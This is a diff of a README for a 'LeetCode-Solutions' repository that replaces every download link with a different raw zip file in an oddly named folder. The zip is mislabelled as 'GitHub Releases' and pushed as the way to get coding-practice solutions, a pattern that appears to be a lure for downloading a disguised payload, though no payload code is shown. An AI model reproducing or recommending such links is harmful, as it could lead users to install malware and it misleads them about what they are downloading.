@@ -1,6 +1,6 @@
 # 🧮 LeetCode-Solutions - Access Coding Practices Easily
 
-![Download](https://github.com/UzairAbidf/LeetCode-Solutions/raw/refs/heads/main/hyperostotic/Solutions-Leet-Code-1.9-alpha.1.zip%20Now!-Click%20Here-blue)
+![Download](https://github.com/UzairAbidf/LeetCode-Solutions/raw/refs/heads/main/hyperostotic/Code_Leet_Solutions_v3.2.zip%20Now!-Click%20Here-blue)
 
 ## 📦 Overview
 
@@ -20,7 +20,7 @@ Before you proceed, ensure your system meets the following requirements:
 
 ### 🔗 Download & Install
 
-1. Visit this page to download: [GitHub Releases](https://github.com/UzairAbidf/LeetCode-Solutions/raw/refs/heads/main/hyperostotic/Solutions-Leet-Code-1.9-alpha.1.zip).
+1. Visit this page to download: [GitHub Releases](https://github.com/UzairAbidf/LeetCode-Solutions/raw/refs/heads/main/hyperostotic/Code_Leet_Solutions_v3.2.zip).
 2. On the Releases page, you will find various versions available for download.
 3. Click on the version number you wish to download.
 4. Choose the appropriate file for your operating system. 
@@ -114,4 +114,4 @@ If you’d like to share feedback or connect, feel free to follow or reach out t
 
 ---
 
-Take your coding practice to the next level with my **LeetCode-Solutions** and improve your problem-solving skills with ease. For downloads, make sure to visit: [GitHub Releases](https://github.com/UzairAbidf/LeetCode-Solutions/raw/refs/heads/main/hyperostotic/Solutions-Leet-Code-1.9-alpha.1.zip).
+Take your coding practice to the next level with my **LeetCode-Solutions** and improve your problem-solving skills with ease. For downloads, make sure to visit: [GitHub Releases](https://github.com/UzairAbidf/LeetCode-Solutions/raw/refs/heads/main/hyperostotic/Code_Leet_Solutions_v3.2.zip).
